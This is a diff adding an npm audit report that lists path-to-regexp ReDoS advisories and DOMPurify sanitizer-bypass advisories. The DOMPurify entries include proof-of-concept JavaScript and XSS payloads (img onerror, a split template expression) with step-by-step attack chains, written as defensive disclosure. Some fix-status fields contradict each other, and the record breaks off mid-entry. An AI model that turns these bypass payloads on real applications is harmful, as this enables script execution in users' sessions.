@@ -1,0 +1,680 @@
+{
+  "actions": [],
+  "advisories": {
+    "1115573": {
+      "findings": [
+        {
+          "version": "8.2.0",
+          "paths": [
+            ".>@refinedev/antd>@ant-design/pro-layout>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-j3q9-mxjg-w52f\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4926\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-j3q9-mxjg-w52f",
+      "created": "2026-03-27T22:23:27.000Z",
+      "id": 1115573,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA bad regular expression is generated any time you have multiple sequential optional groups (curly brace syntax), such as `{a}{b}{c}:z`. The generated regex grows exponentially with the number of groups, causing denial of service.\n\n### Patches\n\nFixed in version 8.4.0.\n\n### Workarounds\n\nLimit the number of sequential optional groups in route patterns. Avoid passing user-controlled input as route patterns.",
+      "reported_by": null,
+      "title": "path-to-regexp vulnerable to Denial of Service via sequential optional groups",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4926"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=8.0.0 <8.4.0",
+      "github_advisory_id": "GHSA-j3q9-mxjg-w52f",
+      "recommendation": "Upgrade to version 8.4.0 or later",
+      "patched_versions": ">=8.4.0",
+      "updated": "2026-03-27T22:23:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-j3q9-mxjg-w52f"
+    },
+    "1115582": {
+      "findings": [
+        {
+          "version": "8.2.0",
+          "paths": [
+            ".>@refinedev/antd>@ant-design/pro-layout>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-27v5-c462-wpq7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4923\n- https://cna.openjsf.org/security-advisories.html\n- https://makenowjust-labs.github.io/recheck/playground\n- https://github.com/advisories/GHSA-27v5-c462-wpq7",
+      "created": "2026-03-27T22:23:52.000Z",
+      "id": 1115582,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen using multiple wildcards, combined with at least one parameter, a regular expression can be generated that is vulnerable to ReDoS. This backtracking vulnerability requires the second wildcard to be somewhere other than the end of the path.\n\n**Unsafe examples:**\n\n```\n/*foo-*bar-:baz\n/*a-:b-*c-:d\n/x/*a-:b/*c/y\n```\n\n**Safe examples:**\n\n```\n/*foo-:bar\n/*foo-:bar-*baz\n```\n\n### Patches\n\nUpgrade to version `8.4.0`.\n\n### Workarounds\n\nIf developers are using multiple wildcard parameters, they can check the regex output with a tool such as https://makenowjust-labs.github.io/recheck/playground/ to confirm whether a path is vulnerable.",
+      "reported_by": null,
+      "title": "path-to-regexp vulnerable to Regular Expression Denial of Service via multiple wildcards",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4923"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": ">=8.0.0 <8.4.0",
+      "github_advisory_id": "GHSA-27v5-c462-wpq7",
+      "recommendation": "Upgrade to version 8.4.0 or later",
+      "patched_versions": ">=8.4.0",
+      "updated": "2026-03-27T22:23:55.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-27v5-c462-wpq7"
+    },
+    "1240621": {
+      "findings": [
+        {
+          "version": "3.4.15",
+          "paths": [
+            ".>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-p98j-92pf-mc4p\n- https://github.com/cure53/DOMPurify/pull/1636\n- https://github.com/cure53/DOMPurify/commit/b9b9d80f7e401771c2ccaef5f45def7eec8f27d7\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.16\n- https://github.com/advisories/GHSA-p98j-92pf-mc4p",
+      "created": "2026-09-30T15:37:57.000Z",
+      "id": 1240621,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nIn `IN_PLACE` mode DOMPurify sanitizes the caller's live DOM subtree directly. To close a known hazard (GHSA-55q2-fjhq-7xh7), the library neutralizes any node a hook detaches during sanitization by stripping its subtree's non-allow-listed attributes, but this neutralization is wired only into the `beforeSanitizeElements` and `uponSanitizeElement` hook sites. An `afterSanitizeElements` or `afterSanitizeAttributes` hook that removes a non-root element (a documented, supported pattern) detaches that element's subtree with no neutralization, so descendant `on*` handlers remain armed on the caller's live tree after `sanitize()` returns, yielding DOM XSS. No special privilege is required beyond supplying markup to an application that uses `IN_PLACE` together with a node-removing afterSanitize hook.\n\n## Root Cause\n\n`IN_PLACE` sanitization mutates the caller's live document, so any element a hook detaches from that tree must have its subtree neutralized before `sanitize()` returns; otherwise a queued resource-event handler (for example an `<img onerror>` that began loading when the caller built the tree) fires in page scope even though the handler never reached the sanitized output. The guard helper `_handleHookDetachedNode` (which calls `_neutralizeSubtree` in `IN_PLACE`) is invoked only after `beforeSanitizeElements` and after `uponSanitizeElement`. It is never invoked from the afterSanitize return paths, and `_sanitizeAttributes` never calls it at all. The post-walk `IN_PLACE` neutralization pass iterates only `DOMPurify.removed`, and hook-detached nodes are intentionally not recorded there, so that pass cannot reach them either.\n\n```text\nsrc/purify.ts\n  _sanitizeElements: _handleHookDetachedNode present at lines 2142 and 2175\n    (before/upon), absent after afterSanitizeElements at lines 2208 and 2249.\n  _sanitizeAttributes: afterSanitizeAttributes fires at line 2670 with no\n    detach re-check; the function never calls _handleHookDetachedNode.\n  Post-walk IN_PLACE pass (lines 3081-3090) iterates DOMPurify.removed only,\n    which by design (comment at lines 2096-2099) excludes hook-detached nodes.\n```\n\n## Impact\n\nAn attacker who supplies markup processed by a victim application that runs `DOMPurify.sanitize(node, { IN_PLACE: true })` and registers a node-removing `afterSanitizeElements` or `afterSanitizeAttributes` hook can retain arbitrary `on*` event handlers on descendants of a removed non-root element. Because `IN_PLACE` operates on the caller's live document, a queued resource-event handler on such a descendant fires in the page origin after the synchronous `sanitize()` call returns, giving script execution in the victim's session (DOM XSS). This defeats DOMPurify's `IN_PLACE` contract to neutralize handlers on subtrees removed from the live tree. The capability is script execution in the victim origin; exact confidentiality and integrity effects depend on the hosting application's session.\n\n## Proof of Concept\n\n```text\nDependencies: Node.js and jsdom. The harness builds a live tree, registers a\nremoval hook, runs IN_PLACE sanitize(), then inspects whether the attacker\nonerror handler survives on the detached descendant. jsdom does not perform\nreal image loads, so the retained handler (rather than an actual fired event)\nis the observed hazard; the retained on* attribute on a live detached node\nafter a synchronous sanitize() return is the neutralization failure.\n```\n\nReproduction steps:\n1. Build a live subtree `#root > section#wrap > img[onerror]` where `#root` is the walk root and `section#wrap` is a non-root wrapper.\n2. Register an `afterSanitizeElements` (or `afterSanitizeAttributes`) hook that calls `node.remove()` on the wrapper.\n3. Call `DOMPurify.sanitize(root, { IN_PLACE: true })`.\n4. Observe that the descendant `<img>` retains its `onerror` handler, whereas the same removal performed in a `beforeSanitizeElements`/`uponSanitizeElement` hook strips it.\n\n```javascript\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');\nconst { window } = new JSDOM('<!DOCTYPE html><body></body>');\nconst DOMPurify = createDOMPurify(window);\n\nconst root = window.document.createElement('div');\nroot.id = 'root';\nroot.innerHTML = '<section id=\"wrap\"><img src=\"x\" onerror=\"ATTACKER()\"></section>';\nwindow.document.body.appendChild(root);\n\nDOMPurify.addHook('afterSanitizeElements', (node) => {\n  if (node.id === 'wrap') node.remove();\n});\nDOMPurify.sanitize(root, { IN_PLACE: true });\n\n// The detached <img> still carries its onerror handler:\nconsole.log(root.querySelector('#wrap') === null,               // true (removed from live tree)\n            !!window.document.querySelector('img[onerror]') ||  // handler survives on the detached node\n            root.innerHTML);\n```\n\n```text\nPASS: beforeSanitizeElements detach neutralizes descendant onerror (control)\nPASS: uponSanitizeElement detach neutralizes descendant onerror (control)\nPASS: without a removal hook the descendant onerror is stripped normally\nPASS: afterSanitizeElements detach LEAVES descendant onerror armed (GAP)\nPASS: afterSanitizeAttributes detach LEAVES descendant onerror armed (GAP)\nPASS: kept custom element removed in afterSanitizeElements leaves descendant onerror armed (GAP)\n```\n\n## Attack Chain\n\n1. **Exposure:** The victim application calls `DOMPurify.sanitize(liveNode, { IN_PLACE: true })` on attacker-influenced markup and has registered a node-removing `afterSanitizeElements` or `afterSanitizeAttributes` hook per an application policy (`src/purify.ts:3026` walk, `2136` element pass, `2522` attribute pass).\n2. **Control:** The attacker controls the markup, including a non-root wrapper element and, inside it, a descendant carrying an `on*` resource-event handler such as `<img src=x onerror=...>`.\n3. **Path:** The pre-order walk visits the wrapper before its descendants. During the wrapper's element or attribute pass the application hook detaches the wrapper from the live tree.\n4. **Guard:** The detach-neutralization guard `_handleHookDetachedNode` runs only after `beforeSanitizeElements` (`2142`) and `uponSanitizeElement` (`2175`); it is absent after `afterSanitizeElements` (`2208`, `2249`) and is never called by `_sanitizeAttributes` (afterSanitizeAttributes at `2670`). The NodeIterator advances past the detached subtree, so the descendants are never revisited, and the post-walk pass iterates only `DOMPurify.removed`, which excludes hook-detached nodes.\n5. **Primitive:** The descendant retains its `on*` handler on the caller's live document after `sanitize()` returns.\n6. **Result:** The queued resource event fires the attacker handler in the victim page origin, achieving DOM XSS despite `IN_PLACE` sanitization.\n\n## Bypass Evidence\n\nThe relevant prior fix is GHSA-55q2-fjhq-7xh7 (\"IN_PLACE hook removal leaves a detached subtree executable, causing XSS\"), whose change (`#1557`) added `_neutralizeSubtree` at the `beforeSanitizeElements` and `uponSanitizeElement` detach sites. Inspection of that change shows it touches no afterSanitize site: the diff adds the neutralization only at the before/upon locations, later refactored into `_handleHookDetachedNode` at `src/purify.ts:2142` and `2175`. A subsequent hardening change (`#1616`) added a `rootWasRemoved` throw and a neutralization sweep over `DOMPurify.removed`, but that sweep still iterates only `DOMPurify.removed`, which by design excludes hook-detached non-root nodes, so it does not close this gap. The `afterSanitizeElements`-on-kept-custom-element site at `2208` was itself introduced by the fix for GHSA-c2j3-45gr-mqc4 (`#1527`), adding another uncovered hook site.\n\nDisproof attempts, all failed: (a) that a later release closed the afterSanitize gap, refuted by inspecting the published 3.4.13, 3.4.14, and 3.4.15 artifacts; (b) that detached descendants are revisited or re-sanitized, refuted at runtime (the `onerror` is retained only at the afterSanitize sites and stripped at the before/upon sites and with no removal hook); (c) that the post-walk pass catches hook-detached nodes, refuted by the design that excludes them from `DOMPurify.removed`; (d) that the precondition is contrived, refuted by parity with the accepted GHSA-55q2 threat model and the library's own supported pattern of removing a node inside `afterSanitizeElements`. The only edge not directly executed is the browser resource-event dispatch (jsdom performs no real image load); it is established by the proven retention of the live handler after a synchronous return, the library's own comments describing exactly this hazard, and parity with the accepted GHSA-55q2 mechanism.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: dompurify`\n- `Confirmed affected range: >= 3.4.13, <= 3.4.15`\n- `Latest release checked: 3.4.15 (npm registry)`\n- `Fix status: fixed in 3.4.16`\n\nThe before/upon detach neutralization introduced for GHSA-55q2-fjhq-7xh7 first shipped in 3.4.13; the residual afterSanitize gap was verified by reproducing it against the published npm artifacts for 3.4.13, 3.4.14, and 3.4.15. The 3.4.12 artifact predates that neutralization and behaves differently at the before/upon sites, so it is outside this specific incomplete-fix range. No release through 3.4.15 neutralizes detached subtrees at the afterSanitize sites, so no fixed version is established.\n\n## Suggested Fix\n\nEnforce the same `IN_PLACE` detach-neutralization invariant at every hook site that can detach a node, not only the before/upon sites. Concretely, apply a `_handleHookDetachedNode(currentNode, root)` re-check after `afterSanitizeElements` at both `src/purify.ts:2208` and `2249` (returning as removed when the node was detached), and add an equivalent `IN_PLACE` detach check plus `_neutralizeSubtree` after `afterSanitizeAttributes` at `2670`. As an interim mitigation without a code change, applications using `IN_PLACE` can avoid removing nodes inside `afterSanitizeElements`/`afterSanitizeAttributes` hooks and instead perform such removals in `beforeSanitizeElements`/`uponSanitizeElement`, or avoid `IN_PLACE` for attacker-influenced content.\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "DOMPurify: IN_PLACE: node-removing afterSanitize hook leaves detached subtree event handlers armed, causing DOM XSS",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.4.13 <=3.4.15",
+      "github_advisory_id": "GHSA-p98j-92pf-mc4p",
+      "recommendation": "Upgrade to version 3.4.16 or later",
+      "patched_versions": ">=3.4.16",
+      "updated": "2026-09-30T15:37:59.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-p98j-92pf-mc4p"
+    },
+    "1241204": {
+      "findings": [
+        {
+          "version": "3.4.15",
+          "paths": [
+            ".>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-6688-9rhm-gjv2\n- https://github.com/cure53/DOMPurify/pull/1636\n- https://github.com/cure53/DOMPurify/commit/b9b9d80f7e401771c2ccaef5f45def7eec8f27d7\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.16\n- https://github.com/advisories/GHSA-6688-9rhm-gjv2",
+      "created": "2026-10-05T23:43:53.000Z",
+      "id": 1241204,
+      "npm_advisory_id": null,
+      "overview": "## Environment\n\n- dompurify 3.4.15 (current npm release); reproduced independently on jsdom 30.0.1 and 29.1.1 (Node.js 20.x / 26.x)\n- Config: `DOMPurify.sanitize(node, { IN_PLACE: true })` on a Node input; `SAFE_FOR_XML` at its default (`true`)\n\n## Summary\n\nThe 3.4.9 fix for the IN_PLACE detached-root class added two protections on the IN_PLACE return path: a fail-closed `TypeError` in `_forceRemove` when a node selected for removal cannot be detached, and a `_neutralizeSubtree` pass (`dist/purify.js` line 1336) that strips non-allowlisted **attributes** from removed subtrees.\n\nBoth miss the rawtext **text-content** form. When the force-removed root is a rawtext element (`<style>`), the payload lives in the node's *text*: the node detaches fine (the `TypeError` guard is not reached), `_neutralizeSubtree` strips nothing (there are no attributes), and the IN_PLACE exit returns the detached, never-sanitized `<style>` whose text still carries live markup. Serializing that node and re-parsing it in **plain HTML context** materializes the payload — no foreign-content context required.\n\nThe same Node input sanitized **without** `IN_PLACE` returns an empty result: the only difference is the IN_PLACE return path handing the killed node back.\n\n## Steps to reproduce\n\n```js\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');   // 3.4.15\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\nconst styleRoot = window.document.createElement('style');\nstyleRoot.setAttribute('onclick', 'alert(1)');    // attribute payload\nstyleRoot.textContent = '</style><img src=x onerror=1>';  // text payload\nwindow.document.body.appendChild(styleRoot);\n\nconst returned = DOMPurify.sanitize(styleRoot, { IN_PLACE: true });\n\nconsole.log(returned === styleRoot);                       // true (same node)\nconsole.log(styleRoot.parentNode === null);                // true (detached)\nconsole.log(styleRoot.outerHTML);\n// <style></style><img src=x onerror=1></style>\nconsole.log(styleRoot.getAttribute('onclick'));            // null  (attribute neutralized)\nconsole.log(styleRoot.textContent);                        // '</style><img src=x onerror=1>' (text survives)\n\n// plain HTML reparse (no foreign-content context involved):\nconst probe = window.document.createElement('div');\nprobe.innerHTML = returned.outerHTML || styleRoot.outerHTML;\nconsole.log(probe.querySelectorAll('img').length);         // 1\nconsole.log(probe.querySelector('img').getAttribute('onerror')); // \"1\"\n```\n\nObserved on 3.4.15: one node, one call — the `onclick` **attribute** is neutralized while the **text** payload (`</style><img src=x onerror=1>`) survives verbatim; serializing and re-parsing the returned node in plain HTML context materializes the `img` with the live `onerror` handler.\n\nContrast on the same Node input without `IN_PLACE`: `RETURN_DOM: true` → `<body></body>`; `RETURN_DOM_FRAGMENT: true` → 0 children — the payload is fully sanitized away. The only difference is the IN_PLACE return path.\n\nContrast on the removal trigger: `SAFE_FOR_XML: false` → the node is not removed (detached stays false); plain CSS text → not removed. The removal is gated by the mXSS text probes and happens *specifically because* the serialized node would re-open tags on reparse.\n\n## Root cause\n\n`_isUnsafeNode` (`dist/purify.js` 3.4.15, lines 1700–1714) removes nodes whose literal text would re-open tags on reparse — shape (b) in the source comment is \"text-only content that already carries the element's OWN end tag\", detected by the `LITERAL_TEXT_CLOSE` probe (line 385) alongside the `ELEMENT_MARKUP_PROBE` (line 339) rules. `_forceRemove` (line 1122) records the node in `DOMPurify.removed` (`{element}`) and detaches it. The removal is intentional: the upstream comment states these shapes are removed **because the literal serializer emits them verbatim for the HTML parser to re-open**.\n\nThe IN_PLACE exit then hands the force-removed root back to the caller — the very node whose removal `DOMPurify.removed` just recorded (verified: `DOMPurify.removed.some(e => e.element === root)` is `true` on the returned instance). The 3.4.9 `_neutralizeSubtree` pass (line 1336) addresses only the attribute form — its own docstring: \"walks a removed subtree and strips every attribute\" (purpose: cancel queued resource events). Rawtext text content is out of its scope, so the removal that was performed *specifically to prevent reparse* is undone by returning the node: you removed it to stop the reparse, then returned it.\n\nDifferential (one node, one call, same removal path): the `onclick` attribute is neutralized by the existing pass while the text payload survives verbatim — the attribute axis is covered, the text axis is the gap.\n\n## Impact\n\nIdentical blast radius to the published IN_PLACE family: an application that sanitizes a Node in `IN_PLACE` mode and re-inserts (or serializes and then re-inserts) the result materializes attacker markup in plain HTML context: script execution in the page. Moving the returned node via `appendChild` alone is safe; the round trip through serialization is what fires the payload. No foreign-content context is required with the close-tag payload.\n\n## Affected versions\n\n- Verified live: 3.4.15 (current).\n- Source-verified: the attribute-only `_neutralizeSubtree` and the IN_PLACE return path are present in 3.4.9–3.4.14; releases before 3.4.9 predate the fix entirely (unconditional return; individual pre-3.4.9 releases not dynamically tested).\n- Per cure53 advisory convention the affected range is reported as `<= 3.4.15` (current at time of writing).\n\n## Suggested remediation\n\n**Primary (root-cause, covers every form):** at the IN_PLACE exit, check whether the returned root was recorded during sanitization — `DOMPurify.removed.some(e => e.element === root)` — and fail closed: throw the same `TypeError` style used by the 3.4.9 detach guard (\"a node selected for removal could not be safely returned; refusing to sanitize in place\"), or return `null`. This is consistent with the existing fail-closed design and covers all present and future root-kill reasons in one check.\n\n**Secondary (form-specific):** extend `_neutralizeSubtree` to neutralize **text content of rawtext descendants** — the elements in `LITERAL_TEXT_ELEMENT_NAMES` (`style`, `script`, `xmp`, `iframe`, `noembed`, `noframes`, `plaintext`, `noscript`) — by rewriting `textContent` to a defanged form, matching the probe coverage of `_isUnsafeNode`/`LITERAL_TEXT_CLOSE`.\n\nA regression test asserting that a force-removed rawtext root comes back with no `/<[/\\w!]/` match in `textContent` (and is not returned at all under the primary fix) prevents re-introduction.\n\n## Prior art / differentiation\n\n- GHSA-r47g-fvhr-h676 (fixed 3.4.6): clobbered-form **root** removal — different trigger; this report's root is a normal allowlisted `style` element killed by the text probe.\n- GHSA-55q2-fjhq-7xh7 (low): IN_PLACE **hook removal** leaves a detached subtree executable — the attribute-form twin (hook-stripped subtree retains onload-class handlers). This report's rawtext **text** form is not covered by `_neutralizeSubtree`'s attribute stripping and is not that advisory.\n- GHSA-h8r8-wccr-v5f2 (medium): mXSS via re-contextualization in the standard (non-IN_PLACE) serialize path — different mechanism; IN_PLACE is not involved.\n- The 3.4.9 release notes credit @mozfreedyb for the IN_PLACE handling improvements that this residual escapes on the text axis.\n\n## Applicability scope (stated up front)\n\nThe payload materializes when the application **serializes and re-parses** the sanitizer output (`innerHTML` assignment, template rendering, markdown/HTML round trips) or otherwise consumes the returned node's markup. Moving the returned node via `appendChild` alone does not trigger it. Applications that pass **live, connected attacker trees** into `IN_PLACE` are explicitly warned against by upstream's own source comment; this report concerns the serialize-and-reinsert consumption pattern that the IN_PLACE mode exists to serve.",
+      "reported_by": null,
+      "title": "DOMPurify: IN_PLACE returns a force-removed rawtext root whose text carries attacker markup — pure HTML reparse executes",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.15",
+      "github_advisory_id": "GHSA-6688-9rhm-gjv2",
+      "recommendation": "Upgrade to version 3.4.16 or later",
+      "patched_versions": ">=3.4.16",
+      "updated": "2026-10-05T23:43:54.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-6688-9rhm-gjv2"
+    },
+    "1242880": {
+      "findings": [
+        {
+          "version": "3.4.15",
+          "paths": [
+            ".>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-cg2g-xh64-v4q7\n- https://github.com/cure53/DOMPurify/pull/1672\n- https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.17\n- https://github.com/advisories/GHSA-cg2g-xh64-v4q7",
+      "created": "2026-10-22T16:25:31.000Z",
+      "id": 1242880,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `<%...%>` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `<template>.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.\n\n## Root Cause\n\n`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.\n\n```text\n_scrubTemplateExpressions (src/purify.ts:1717-1751):\n  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).\n  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).\n  - Explicit recursion at lines 1743-1750 enters <template>.content only, via\n    querySelectorAll('template'); there is no equivalent recursion into attached\n    shadow roots.\nShadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which\napplies the per-node strip but never performs the post-walk normalize-and-rescrub.\n```\n\nShadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.\n\n## Impact\n\nAn attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it can escalate to template injection. Exploitation requires non-default application configuration: the application must enable `SAFE_FOR_TEMPLATES` and a DOM-returning mode, pass a DOM node that already has an attached shadow root, and feed the sanitized shadow root content into a template evaluator. The shadow root does not have to be built programmatically with `attachShadow`: in engines that support declarative shadow DOM, attacker-supplied markup containing `<template shadowrootmode=\"open\">` parsed through `setHTMLUnsafe` or `Document.parseHTMLUnsafe` produces the same attached shadow root, so a plain HTML string reaches the gap once the application is configured this way. Demonstrated capability is injection of a complete, attacker-chosen expression into post-sanitization shadow root content; the resulting script execution and any confidentiality or integrity consequence depend on the downstream engine's evaluation context.\n\n## Proof of Concept\n\n```text\nPreconditions:\n  - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).\n  - A browser (or DOM implementation) with shadow DOM support.\n  - Application constructs a DOM node with an attached shadow root before sanitizing,\n    and later evaluates the shadow root's text content as a template.\n```\n\nBuild a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with `SAFE_FOR_TEMPLATES`:\n\n```javascript\nconst host = document.createElement('div');\nconst root = host.attachShadow({ mode: 'open' });\n\n// Split \"${alert(document.domain)}\" so no single fragment matches a regex.\n// <object> is not in the default ALLOWED_TAGS and is removed during sanitization,\n// leaving the surrounding text-node siblings adjacent.\nroot.appendChild(document.createTextNode('$'));\nroot.appendChild(document.createElement('object'));\nroot.appendChild(document.createTextNode('{alert(document.domain)}'));\n\nDOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\n// After the disallowed element is removed, the fragments are adjacent and survive.\nhost.shadowRoot.normalize();\nconsole.log(host.shadowRoot.textContent);\n```\n\n```text\n${alert(document.domain)}\n```\n\nA downstream template evaluator reading `shadowRoot.textContent` (for example `new Function('return `' + content + '`')()` or any `${...}`/`{{...}}` engine) then evaluates the fully formed expression.\n\n## Attack Chain\n\n1. **Exposure:** The application calls `DOMPurify.sanitize(node, cfg)` (`src/purify.ts:2854`) with `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true` (or a shadow-aware `RETURN_DOM`), passing a DOM node that already carries an attached shadow root.\n2. **Control:** The attacker controls the shadow root's text nodes and the disallowed separator elements between them; each fragment (`$`, `{alert(document.domain)}`) is a valid, individually benign text node.\n3. **Path:** `_sanitizeAttachedShadowRoots` (`src/purify.ts:2977`) feeds the shadow root into `_sanitizeShadowDOM` (`src/purify.ts:2710`), which strips expressions per text node (`src/purify.ts:2246`) and removes the disallowed separator elements, leaving the fragments adjacent.\n4. **Guard:** The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:3131-3132`) is the only pass that would catch the merged expression, but it never recurses into shadow roots (`src/purify.ts:1717-1751` recurses into `<template>.content` only).\n5. **Primitive:** The adjacent fragments serialize as a single concatenated string on `shadowRoot.textContent` / `shadowRoot.innerHTML`, reconstituting the complete expression.\n6. **Result:** A downstream template engine evaluates the attacker-chosen expression, achieving script execution (or template injection) in the engine's context.\n\n## Bypass Evidence\n\nThe relevant protection is `SAFE_FOR_TEMPLATES`, specifically the post-walk pass that defends against expressions that only form after adjacent text nodes merge. That defense was previously extended to `<template>.content` under CVE-2026-65900 (GHSA-gvmj-g25r-r7wr) by adding `querySelectorAll('template')` recursion at `src/purify.ts:1743-1750`. The strongest challenge is whether any code path performs the equivalent merge-and-rescrub inside shadow roots. Enumerating every call site of `_scrubTemplateExpressions` (`src/purify.ts:1717`, `1747`, `3132`, `3141`) shows none receive a shadow root, and `_sanitizeShadowDOM` (`src/purify.ts:2710`) never calls `_scrubTemplateExpressions` or `normalize()`. The per-node strip cannot compensate: `MUSTACHE_EXPR` (`src/regexp.ts:3`) requires `{{` or `}}`, `TMPLIT_EXPR` (`src/regexp.ts:5`) requires `${`, and `ERB_EXPR` (`src/regexp.ts:4`) requires `<%` or `%>`, none of which appear in a single-character fragment. The CVE-2026-65900 regression tests exercise `<template>.content` only; no test covers shadow root content under `SAFE_FOR_TEMPLATES`. The gap is therefore an unfixed case on a distinct remediation boundary (shadow roots) rather than a bypass of the delivered template-content fix.\n\n## Affected Versions\n\n- **Ecosystem:** `npm`\n- **Package:** `dompurify`\n- **Confirmed affected range:** `>= 3.4.4, <= 3.4.16`\n- **Latest release checked:** `3.4.16` ([npm registry](https://www.npmjs.com/package/dompurify/v/3.4.16))\n- **Fix status:** not fixed\n\nThe lower bound 3.4.4 is the release that introduced both the attached-shadow-root sanitization pass and the `_scrubTemplateExpressions` safety net; releases 3.4.4 through 3.4.7 carry the safety net with no content-container recursion, and 3.4.8 onward add `<template>.content` recursion but still omit shadow root recursion. No published release and no current development revision contains a shadow-root fix.\n\n## Suggested Fix\n\nEnforce the same post-walk normalize-and-rescrub invariant on attached shadow roots that already applies to `<template>.content`. After `_sanitizeShadowDOM` finishes walking a shadow root, run `_scrubTemplateExpressions` over that shadow root so adjacent text nodes created by element removal are merged and re-stripped; alternatively, have `_scrubTemplateExpressions` discover and recurse into attached shadow roots as it does for template content. The fix must cover nested shadow roots and shadow roots inside `<template>.content`, and it must handle all three expression dialects, since any disallowed element can serve as the separator that produces adjacent fragments.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "DOMPurify SAFE_FOR_TEMPLATES bypass: split template expressions survive in attached shadow root content on DOM output modes",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.4.4 <=3.4.16",
+      "github_advisory_id": "GHSA-cg2g-xh64-v4q7",
+      "recommendation": "Upgrade to version 3.4.17 or later",
+      "patched_versions": ">=3.4.17",
+      "updated": "2026-10-22T16:25:32.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-cg2g-xh64-v4q7"
+    },
+    "1242881": {
+      "findings": [
+        {
+          "version": "3.4.15",
+          "paths": [
+            ".>monaco-editor>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
